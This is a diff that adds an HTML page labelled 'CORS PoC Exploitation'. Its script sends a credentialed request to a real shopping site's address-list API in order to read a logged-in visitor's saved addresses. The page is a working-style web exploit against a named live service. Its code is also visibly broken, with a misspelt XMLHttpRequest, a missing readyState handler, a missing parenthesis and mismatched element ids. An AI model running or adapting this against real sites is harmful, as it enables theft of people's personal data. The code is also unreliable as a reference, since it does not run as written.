@@ -1,0 +1,27 @@
+<!DOCTYPE Html>
+<html>
+  <head>
+   <script>
+    function cors () {
+      var xhttp = new XMLHttpRequeat();
+       if (this.readyState == 4 && this.status == 200) {
+           document.getElementById("emo").innerHTML = alert(this.responseText);
+           
+       }
+     };
+     xhttp.open("GET", "https://www.lazada.co.id/address/api/listAddress", true;
+     xhttp.withCredentials = true;
+     xhttp.send();
+     }
+     </script>
+     </head>
+     <body>
+       <center>
+       <h1> CORS PoC Exploitation </h1>
+       <h2> Created By <a href="http://nekopoi.care"></a></h2>
+       <h3> Show Full Of Content Page </h3>
+       <div id="demo">
+         <button type="button" onclick="cors()">Run</button>
+         </div>
+        </body>
+        </html>
